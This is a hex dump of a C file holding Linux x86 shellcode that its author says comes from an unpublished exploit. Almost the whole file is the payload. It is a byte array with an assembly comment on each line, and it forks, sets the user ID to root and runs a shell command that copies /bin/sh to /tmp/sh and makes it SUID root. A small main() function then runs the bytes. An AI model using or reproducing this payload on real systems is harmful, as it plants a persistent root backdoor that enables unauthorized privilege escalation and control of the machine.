00000000  2f 2a 20 0d 0a 20 20 20  6c 69 6e 75 78 2f 78 38  |/* ..   linux/x8|
00000010  36 20 28 73 68 61 6d 65  6c 65 73 73 6c 79 20 72  |6 (shamelessly r|
00000020  69 70 70 65 64 20 66 72  6f 6d 20 6f 6e 65 20 6f  |ipped from one o|
00000030  66 20 6d 79 20 75 6e 70  75 62 6c 69 73 68 65 64  |f my unpublished|
00000040  20 65 78 70 6c 6f 69 74  73 29 0d 0a 2a 2f 0d 0a  | exploits)..*/..|
00000050  2f 2a 0d 0a 20 20 20 66  6f 72 6b 28 29 27 73 2c  |/*..   fork()'s,|
00000060  20 64 6f 65 73 20 73 65  74 72 65 75 69 64 28 30  | does setreuid(0|
00000070  2c 20 30 29 3b 20 74 68  65 6e 20 65 78 65 63 76  |, 0); then execv|
00000080  65 28 29 27 73 3a 0d 0a  20 20 20 20 20 2f 62 69  |e()'s:..     /bi|
00000090  6e 2f 73 68 20 2d 63 20  22 63 70 20 2f 62 69 6e  |n/sh -c "cp /bin|
000000a0  2f 73 68 20 2f 74 6d 70  2f 73 68 3b 20 63 68 6d  |/sh /tmp/sh; chm|
000000b0  6f 64 20 34 37 35 35 20  2f 74 6d 70 2f 73 68 22  |od 4755 /tmp/sh"|
000000c0  0d 0a 20 20 0d 0a 20 20  20 68 65 6e 63 65 20 64  |..  ..   hence d|
000000d0  72 6f 70 70 69 6e 67 20  61 20 53 55 49 44 20 72  |ropping a SUID r|
000000e0  6f 6f 74 20 73 68 65 6c  6c 20 69 6e 20 2f 74 6d  |oot shell in /tm|
000000f0  70 2e 0d 0a 2a 2f 0d 0a  0d 0a 63 68 61 72 20 73  |p...*/....char s|
00000100  68 65 6c 6c 63 5b 5d 20  3d 0d 0a 2f 2a 20 53 68  |hellc[] =../* Sh|
00000110  65 6c 6c 63 6f 64 65 20  74 6f 20 64 72 6f 70 20  |ellcode to drop |
00000120  61 20 53 55 49 44 20 72  6f 6f 74 20 73 68 65 6c  |a SUID root shel|
00000130  6c 20 69 6e 20 2f 74 6d  70 2f 73 68 2e 20 0d 0a  |l in /tmp/sh. ..|
00000140  20 20 20 46 6f 72 67 69  76 65 20 74 68 65 20 49  |   Forgive the I|
00000150  6e 74 65 6c 20 73 79 6e  74 61 78 20 69 6e 20 74  |ntel syntax in t|
00000160  68 65 20 63 6f 6d 6d 65  6e 74 69 6e 67 2c 20 62  |he commenting, b|
00000170  6f 72 65 64 20 77 69 74  68 20 41 54 26 54 20 73  |ored with AT&T s|
00000180  79 6e 74 61 78 2e 2e 0d  0a 20 2a 2f 0d 0a 0d 0a  |yntax.... */....|
00000190  2f 2a 20 6d 61 69 6e 3a  20 69 66 20 28 66 6f 72  |/* main: if (for|
000001a0  6b 28 29 29 20 67 6f 74  6f 20 65 78 65 75 6e 74  |k()) goto exeunt|
000001b0  3b 20 65 6c 73 65 20 67  6f 74 6f 20 63 61 72 72  |; else goto carr|
000001c0  79 6f 6e 3b 20 2a 2f 0d  0a 22 5c 78 32 39 5c 78  |yon; */.."\x29\x|
000001d0  63 30 22 20 20 20 20 20  20 20 20 20 20 20 20 20  |c0"             |
000001e0  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
000001f0  20 20 20 20 2f 2a 20 73  75 62 20 61 78 2c 20 61  |    /* sub ax, a|
00000200  78 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |x               |
00000210  2a 2f 0d 0a 22 5c 78 62  30 5c 78 30 32 22 20 20  |*/.."\xb0\x02"  |
00000220  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
00000230  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 2f  |               /|
00000240  2a 20 6d 6f 76 20 61 6c  2c 20 32 20 20 20 20 20  |* mov al, 2     |
00000250  20 20 20 20 20 20 20 20  20 20 20 2a 2f 0d 0a 22  |           */.."|
00000260  5c 78 63 64 5c 78 38 30  22 20 20 20 20 20 20 20  |\xcd\x80"       |
00000270  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
00000280  20 20 20 20 20 20 20 20  20 20 2f 2a 20 69 6e 74  |          /* int|
00000290  20 30 78 38 30 20 20 20  20 20 20 20 20 20 20 20  | 0x80           |
000002a0  20 20 20 20 20 20 2a 2f  0d 0a 22 5c 78 38 35 5c  |      */.."\x85\|
000002b0  78 63 30 22 20 20 20 20  20 20 20 20 20 20 20 20  |xc0"            |
000002c0  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
000002d0  20 20 20 20 20 2f 2a 20  74 65 73 74 20 61 78 2c  |     /* test ax,|
000002e0  20 61 78 20 20 20 20 20  20 20 20 20 20 20 20 20  | ax             |
000002f0  20 2a 2f 0d 0a 22 5c 78  37 35 5c 78 30 32 22 20  | */.."\x75\x02" |
00000300  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
*
00000320  2f 2a 20 6a 6e 7a 20 65  78 65 75 6e 74 20 20 20  |/* jnz exeunt   |
00000330  20 20 20 20 20 20 20 20  20 20 20 20 2a 2f 0d 0a  |            */..|
00000340  22 5c 78 65 62 5c 78 30  35 22 20 20 20 20 20 20  |"\xeb\x05"      |
00000350  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
00000360  20 20 20 20 20 20 20 20  20 20 20 2f 2a 20 6a 6d  |           /* jm|
00000370  70 20 63 61 72 72 79 6f  6e 20 20 20 20 20 20 20  |p carryon       |
00000380  20 20 20 20 20 20 20 2a  2f 0d 0a 0d 0a 2f 2a 20  |       */..../* |
00000390  65 78 65 75 6e 74 3a 20  65 78 69 74 28 78 29 3b  |exeunt: exit(x);|
000003a0  20 2a 2f 0d 0a 22 5c 78  32 39 5c 78 63 30 22 20  | */.."\x29\xc0" |
000003b0  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
*
000003d0  2f 2a 20 73 75 62 20 61  78 2c 20 61 78 20 20 20  |/* sub ax, ax   |
000003e0  20 20 20 20 20 20 20 20  20 20 20 20 2a 2f 0d 0a  |            */..|
000003f0  22 5c 78 34 30 22 20 20  20 20 20 20 20 20 20 20  |"\x40"          |
00000400  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
00000410  20 20 20 20 20 20 20 20  20 20 20 2f 2a 20 69 6e  |           /* in|
00000420  63 20 61 78 20 20 20 20  20 20 20 20 20 20 20 20  |c ax            |
00000430  20 20 20 20 20 20 20 2a  2f 0d 0a 22 5c 78 63 64  |       */.."\xcd|
00000440  5c 78 38 30 22 20 20 20  20 20 20 20 20 20 20 20  |\x80"           |
00000450  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
00000460  20 20 20 20 20 20 2f 2a  20 69 6e 74 20 30 78 38  |      /* int 0x8|
00000470  30 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |0               |
00000480  20 20 2a 2f 0d 0a 0d 0a  2f 2a 20 63 61 72 72 79  |  */..../* carry|
00000490  6f 6e 3a 20 73 65 74 72  65 75 69 64 28 30 2c 20  |on: setreuid(0, |
000004a0  30 29 3b 20 67 6f 74 6f  20 63 61 6c 6c 7a 3b 20  |0); goto callz; |
000004b0  2a 2f 0d 0a 22 5c 78 32  39 5c 78 63 30 22 20 20  |*/.."\x29\xc0"  |
000004c0  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
000004d0  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 2f  |               /|
000004e0  2a 20 73 75 62 20 61 78  2c 20 61 78 20 20 20 20  |* sub ax, ax    |
000004f0  20 20 20 20 20 20 20 20  20 20 20 2a 2f 0d 0a 22  |           */.."|
00000500  5c 78 32 39 5c 78 64 62  22 20 20 20 20 20 20 20  |\x29\xdb"       |
00000510  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
00000520  20 20 20 20 20 20 20 20  20 20 2f 2a 20 73 75 62  |          /* sub|
00000530  20 62 78 2c 20 62 78 20  20 20 20 20 20 20 20 20  | bx, bx         |
00000540  20 20 20 20 20 20 2a 2f  0d 0a 22 5c 78 32 39 5c  |      */.."\x29\|
00000550  78 63 39 22 20 20 20 20  20 20 20 20 20 20 20 20  |xc9"            |
00000560  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
00000570  20 20 20 20 20 2f 2a 20  73 75 62 20 63 78 2c 20  |     /* sub cx, |
00000580  63 78 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |cx              |
00000590  20 2a 2f 0d 0a 22 5c 78  62 30 5c 78 34 36 22 20  | */.."\xb0\x46" |
000005a0  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
*
000005c0  2f 2a 20 6d 6f 76 20 61  6c 2c 20 30 78 34 36 20  |/* mov al, 0x46 |
000005d0  20 20 20 20 20 20 20 20  20 20 20 20 2a 2f 0d 0a  |            */..|
000005e0  22 5c 78 63 64 5c 78 38  30 22 20 20 20 20 20 20  |"\xcd\x80"      |
000005f0  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
00000600  20 20 20 20 20 20 20 20  20 20 20 2f 2a 20 69 6e  |           /* in|
00000610  74 20 30 78 38 30 20 20  20 20 20 20 20 20 20 20  |t 0x80          |
00000620  20 20 20 20 20 20 20 2a  2f 0d 0a 22 5c 78 65 62  |       */.."\xeb|
00000630  5c 78 32 61 22 20 20 20  20 20 20 20 20 20 20 20  |\x2a"           |
00000640  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
00000650  20 20 20 20 20 20 2f 2a  20 6a 6d 70 20 63 61 6c  |      /* jmp cal|
00000660  6c 7a 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |lz              |
00000670  20 20 2a 2f 0d 0a 0d 0a  2f 2a 20 73 74 61 72 74  |  */..../* start|
00000680  3a 20 65 78 65 63 76 65  28 29 20 2a 2f 0d 0a 22  |: execve() */.."|
00000690  5c 78 35 65 22 20 20 20  20 20 20 20 20 20 20 20  |\x5e"           |
000006a0  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
000006b0  20 20 20 20 20 20 20 20  20 20 2f 2a 20 70 6f 70  |          /* pop|
000006c0  20 73 69 20 20 20 20 20  20 20 20 20 20 20 20 20  | si             |
000006d0  20 20 20 20 20 20 2a 2f  0d 0a 22 5c 78 38 39 5c  |      */.."\x89\|
000006e0  78 37 36 5c 78 33 32 22  20 20 20 20 20 20 20 20  |x76\x32"        |
000006f0  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
00000700  20 20 20 20 20 2f 2a 20  6d 6f 76 20 5b 62 70 2b  |     /* mov [bp+|
00000710  30 78 33 32 5d 2c 20 73  69 20 20 20 20 20 20 20  |0x32], si       |
00000720  20 2a 2f 0d 0a 22 5c 78  38 64 5c 78 35 65 5c 78  | */.."\x8d\x5e\x|
00000730  30 38 22 20 20 20 20 20  20 20 20 20 20 20 20 20  |08"             |
00000740  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
00000750  2f 2a 20 6c 65 61 20 62  78 2c 20 5b 62 70 2b 30  |/* lea bx, [bp+0|
00000760  78 30 38 5d 20 20 20 20  20 20 20 20 2a 2f 0d 0a  |x08]        */..|
00000770  22 5c 78 38 39 5c 78 35  65 5c 78 33 36 22 20 20  |"\x89\x5e\x36"  |
00000780  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
00000790  20 20 20 20 20 20 20 20  20 20 20 2f 2a 20 6d 6f  |           /* mo|
000007a0  76 20 5b 62 70 2b 30 78  33 36 5d 2c 20 62 78 20  |v [bp+0x36], bx |
000007b0  20 20 20 20 20 20 20 2a  2f 0d 0a 22 5c 78 38 64  |       */.."\x8d|
000007c0  5c 78 35 65 5c 78 30 62  22 20 20 20 20 20 20 20  |\x5e\x0b"       |
000007d0  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
000007e0  20 20 20 20 20 20 2f 2a  20 6c 65 61 20 62 78 2c  |      /* lea bx,|
000007f0  20 5b 62 70 2b 30 78 30  62 5d 20 20 20 20 20 20  | [bp+0x0b]      |
00000800  20 20 2a 2f 0d 0a 22 5c  78 38 39 5c 78 35 65 5c  |  */.."\x89\x5e\|
00000810  78 33 61 22 20 20 20 20  20 20 20 20 20 20 20 20  |x3a"            |
00000820  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
00000830  20 2f 2a 20 6d 6f 76 20  5b 62 70 2b 30 78 33 61  | /* mov [bp+0x3a|
00000840  5d 2c 20 62 78 20 20 20  20 20 20 20 20 2a 2f 0d  |], bx        */.|
00000850  0a 22 5c 78 32 39 5c 78  63 30 22 20 20 20 20 20  |."\x29\xc0"     |
00000860  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
00000870  20 20 20 20 20 20 20 20  20 20 20 20 2f 2a 20 73  |            /* s|
00000880  75 62 20 61 78 2c 20 61  78 20 20 20 20 20 20 20  |ub ax, ax       |
00000890  20 20 20 20 20 20 20 20  2a 2f 0d 0a 22 5c 78 38  |        */.."\x8|
000008a0  38 5c 78 34 36 5c 78 30  37 22 20 20 20 20 20 20  |8\x46\x07"      |
000008b0  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
000008c0  20 20 20 20 20 20 20 2f  2a 20 6d 6f 76 20 5b 62  |       /* mov [b|
000008d0  70 2b 30 78 30 37 5d 2c  20 61 6c 20 20 20 20 20  |p+0x07], al     |
000008e0  20 20 20 2a 2f 0d 0a 22  5c 78 38 38 5c 78 34 36  |   */.."\x88\x46|
000008f0  5c 78 30 61 22 20 20 20  20 20 20 20 20 20 20 20  |\x0a"           |
00000900  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
00000910  20 20 2f 2a 20 6d 6f 76  20 5b 62 70 2b 30 78 30  |  /* mov [bp+0x0|
00000920  61 5d 2c 20 61 6c 20 20  20 20 20 20 20 20 2a 2f  |a], al        */|
00000930  0d 0a 22 5c 78 38 38 5c  78 34 36 5c 78 33 31 22  |.."\x88\x46\x31"|
00000940  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
00000950  20 20 20 20 20 20 20 20  20 20 20 20 20 2f 2a 20  |             /* |
00000960  6d 6f 76 20 5b 62 70 2b  30 78 33 31 5d 2c 20 61  |mov [bp+0x31], a|
00000970  6c 20 20 20 20 20 20 20  20 2a 2f 0d 0a 22 5c 78  |l        */.."\x|
00000980  38 39 5c 78 34 36 5c 78  33 65 22 20 20 20 20 20  |89\x46\x3e"     |
00000990  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
000009a0  20 20 20 20 20 20 20 20  2f 2a 20 6d 6f 76 20 5b  |        /* mov [|
000009b0  62 70 2b 30 78 33 65 5d  2c 20 61 78 20 20 20 20  |bp+0x3e], ax    |
000009c0  20 20 20 20 2a 2f 0d 0a  22 5c 78 38 37 5c 78 66  |    */.."\x87\xf|
000009d0  33 22 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |3"              |
000009e0  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
000009f0  20 20 20 2f 2a 20 78 63  68 67 20 73 69 2c 20 62  |   /* xchg si, b|
00000a00  78 20 20 20 20 20 20 20  20 20 20 20 20 20 20 2a  |x              *|
00000a10  2f 0d 0a 22 5c 78 62 30  5c 78 30 62 22 20 20 20  |/.."\xb0\x0b"   |
00000a20  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
00000a30  20 20 20 20 20 20 20 20  20 20 20 20 20 20 2f 2a  |              /*|
00000a40  20 6d 6f 76 20 61 6c 2c  20 30 78 30 62 20 20 20  | mov al, 0x0b   |
00000a50  20 20 20 20 20 20 20 20  20 20 2a 2f 0d 0a 22 5c  |          */.."\|
00000a60  78 38 64 5c 78 34 62 5c  78 33 32 22 20 20 20 20  |x8d\x4b\x32"    |
00000a70  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
00000a80  20 20 20 20 20 20 20 20  20 2f 2a 20 6c 65 61 20  |         /* lea |
00000a90  63 78 2c 20 5b 62 70 2b  64 69 2b 30 78 33 32 5d  |cx, [bp+di+0x32]|
00000aa0  20 20 20 20 20 2a 2f 0d  0a 22 5c 78 38 64 5c 78  |     */.."\x8d\x|
00000ab0  35 33 5c 78 33 65 22 20  20 20 20 20 20 20 20 20  |53\x3e"         |
00000ac0  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
00000ad0  20 20 20 20 2f 2a 20 6c  65 61 20 64 78 2c 20 5b  |    /* lea dx, [|
00000ae0  62 70 2b 64 69 2b 30 78  33 65 5d 20 20 20 20 20  |bp+di+0x3e]     |
00000af0  2a 2f 0d 0a 22 5c 78 63  64 5c 78 38 30 22 20 20  |*/.."\xcd\x80"  |
00000b00  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
00000b10  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 2f  |               /|
00000b20  2a 20 69 6e 74 20 30 78  38 30 20 20 20 20 20 20  |* int 0x80      |
00000b30  20 20 20 20 20 20 20 20  20 20 20 2a 2f 0d 0a 0d  |           */...|
00000b40  0a 2f 2a 20 63 61 6c 6c  7a 3a 20 63 61 6c 6c 20  |./* callz: call |
00000b50  73 74 61 72 74 20 2a 2f  0d 0a 22 5c 78 65 38 5c  |start */.."\xe8\|
00000b60  78 64 31 5c 78 66 66 5c  78 66 66 5c 78 66 66 22  |xd1\xff\xff\xff"|
00000b70  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
00000b80  20 20 20 20 20 2f 2a 20  63 61 6c 6c 20 73 74 61  |     /* call sta|
00000b90  72 74 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |rt              |
00000ba0  20 2a 2f 0d 0a 0d 0a 2f  2a 20 64 61 74 61 20 2d  | */..../* data -|
00000bb0  20 63 6f 6d 6d 61 6e 64  20 74 6f 20 65 78 65 63  | command to exec|
00000bc0  76 65 28 29 20 2a 2f 0d  0a 22 5c 78 32 66 5c 78  |ve() */.."\x2f\x|
00000bd0  36 32 5c 78 36 39 5c 78  36 65 5c 78 32 66 5c 78  |62\x69\x6e\x2f\x|
00000be0  37 33 5c 78 36 38 5c 78  32 30 5c 78 32 64 5c 78  |73\x68\x20\x2d\x|
00000bf0  36 33 5c 78 32 30 5c 78  36 33 5c 78 37 30 5c 78  |63\x20\x63\x70\x|
00000c00  32 30 5c 78 32 66 5c 78  36 32 5c 78 36 39 5c 78  |20\x2f\x62\x69\x|
00000c10  36 65 5c 78 32 66 22 0d  0a 22 5c 78 37 33 5c 78  |6e\x2f".."\x73\x|
00000c20  36 38 5c 78 32 30 5c 78  32 66 5c 78 37 34 5c 78  |68\x20\x2f\x74\x|
00000c30  36 64 5c 78 37 30 5c 78  32 66 5c 78 37 33 5c 78  |6d\x70\x2f\x73\x|
00000c40  36 38 5c 78 33 62 5c 78  32 30 5c 78 36 33 5c 78  |68\x3b\x20\x63\x|
00000c50  36 38 5c 78 36 64 5c 78  36 66 5c 78 36 34 5c 78  |68\x6d\x6f\x64\x|
00000c60  32 30 5c 78 33 34 22 0d  0a 22 5c 78 33 37 5c 78  |20\x34".."\x37\x|
00000c70  33 35 5c 78 33 35 5c 78  32 30 5c 78 32 66 5c 78  |35\x35\x20\x2f\x|
00000c80  37 34 5c 78 36 64 5c 78  37 30 5c 78 32 66 5c 78  |74\x6d\x70\x2f\x|
00000c90  37 33 5c 78 36 38 22 3b  0d 0a 0d 0a 2f 2a 2a 20  |73\x68";..../** |
00000ca0  74 65 73 74 20 6f 75 74  20 74 68 65 20 73 68 65  |test out the she|
00000cb0  6c 6c 63 6f 64 65 20 2a  2a 2f 0d 0a 6d 61 69 6e  |llcode **/..main|
00000cc0  20 28 29 0d 0a 7b 0d 0a  20 20 76 6f 69 64 20 28  | ()..{..  void (|
00000cd0  2a 73 63 29 28 29 20 3d  20 28 76 6f 69 64 20 2a  |*sc)() = (void *|
00000ce0  29 73 68 65 6c 6c 63 3b  20 73 63 28 29 3b 0d 0a  |)shellc; sc();..|
00000cf0  7d                                                |}|
00000cf1
